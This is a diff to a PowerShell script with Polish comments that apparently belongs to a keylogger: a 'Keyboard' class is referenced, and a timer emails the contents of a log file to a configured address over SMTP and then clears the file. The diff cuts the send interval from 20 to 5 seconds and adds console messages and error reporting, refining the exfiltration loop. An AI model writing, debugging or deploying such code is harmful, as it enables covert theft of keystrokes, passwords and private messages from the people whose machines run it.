@@ -20,24 +20,31 @@ public class Keyboard {
 }
 "@
 
-# Timer do wysyłania maila co 20 sekund
+# Timer do wysyłania maila co 5 sekund
 $timer = New-Object Timers.Timer
-$timer.Interval = 20000
+$timer.Interval = 5000  # Interwał w milisekundach (5000 ms = 5 sekund)
 $timer.AutoReset = $true
 $timer.add_Elapsed({
     if (Test-Path $logFile) {
         $body = Get-Content $logFile -Raw
         if ($body -ne "") {
+            Write-Host "Przygotowanie do wysłania e-maila..."
             $smtp = New-Object Net.Mail.SmtpClient($smtpServer, 465)
             $smtp.EnableSsl = $true
             $smtp.Credentials = New-Object System.Net.NetworkCredential($username, $password)
             try {
+                Write-Host "Wysyłanie e-maila..."
                 $smtp.Send($smtpFrom, $smtpTo, $subject, $body)
+                Write-Host "E-mail wysłany pomyślnie."
                 Clear-Content -Path $logFile
             } catch {
-                # Jeśli wysyłka się nie uda — nic nie rób.
+                Write-Host "Błąd podczas wysyłania e-maila: $_"
             }
+        } else {
+            Write-Host "Plik logów jest pusty. E-mail nie został wysłany."
         }
+    } else {
+        Write-Host "Plik logów nie istnieje."
     }
 })
 $timer.Start()
